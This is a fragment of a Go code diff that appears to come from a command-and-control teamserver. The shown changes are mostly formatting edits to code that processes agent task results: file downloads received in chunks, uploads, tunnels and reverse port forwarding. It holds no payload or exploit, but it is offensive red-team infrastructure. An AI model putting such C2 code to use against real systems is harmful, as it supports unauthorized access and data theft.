-					task.Message = "Received Information about Kharon"
-					task.ClearText = b.String()
-
 				case TASK_UPLOAD:
 					// testjar := cmd_packer.ParseString()
 					task.Message = "Initiated File Upload\n"
@@ -3079,7 +3496,7 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 							_ = ts.TsDownloadUpdate(file_id, 1, file_bytes)
 							_ = ts.TsDownloadClose(file_id, 3)
 							task.Message += fmt.Sprintf("File '%s' download completed, size: %d bytes\n", file_id, file_size)
-						}else{
+						} else {
 							_ = ts.TsDownloadUpdate(file_id, 1, file_bytes)
 							task.Message += fmt.Sprintf("File '%s', Chunk: %d/%d download completed, size: %d bytes\n", file_id, cur_chunk, total_chunks, file_size)
 						}
@@ -3285,7 +3702,6 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 						}
 					}
 
-
 					numEvents_COMMAND_TUNNEL_START_TCP := cmd_packer.ParseInt32()
 					if numEvents_COMMAND_TUNNEL_START_TCP > 0 {
 						fmt.Printf(" TASK_PROCESS_TUNNEL - numEvents_COMMAND_TUNNEL_START_TCP: %d\n", numEvents_COMMAND_TUNNEL_START_TCP)
@@ -3448,7 +3864,7 @@ RET:
 }
 
 func TunnelReverse(tunnelId int, port int) ([]byte, error) {
-	
+
 	array := []interface{}{TASK_RPORTFWD, int(tunnelId), int(port)}
 
 	fmt.Printf("TunnelReverse\n")
